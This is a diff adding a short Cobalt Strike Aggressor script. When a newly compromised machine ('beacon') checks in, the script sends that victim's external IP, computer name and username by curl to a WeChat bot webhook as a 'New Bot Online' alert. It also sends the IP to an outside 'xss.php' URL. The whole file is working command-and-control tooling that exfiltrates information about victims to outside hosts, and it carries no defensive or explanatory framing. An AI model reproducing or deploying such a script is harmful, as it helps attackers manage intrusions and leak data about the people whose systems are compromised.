@@ -1,0 +1,27 @@
+
+# auth:CoolCat
+
+$webhook = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=yourWeChatBotKey";
+
+on ready {
+    println("running");
+    @curl_command = @('curl', '-X', 'POST', '--data-binary', '{"msgtype": "text", "text": {"content": "Script is working..."}}',$webhook);
+	exec(@curl_command);
+}
+
+on beacon_initial {
+    local('$externalIP $computerName $userName');
+    $externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+
+    $message = 'New Bot Online: \n\n Computer name'.$computerName.'\n\nUsername:'.$userName.'\n\nexternalIP:: '.$externalIP;
+
+    @curl_command = @('curl', '-X', 'POST', '--data-binary', '{"msgtype": "text", "text": {"content": "'. $message .'"}}',$webhook);
+	exec(@curl_command);
+
+	$xssApi = "http://www.baidu.com/xss.php?ip=".$externalIP;
+
+    @curl_command = @('curl', '-X', 'GET', $xssApi);
+    exec(@curl_command);
+}
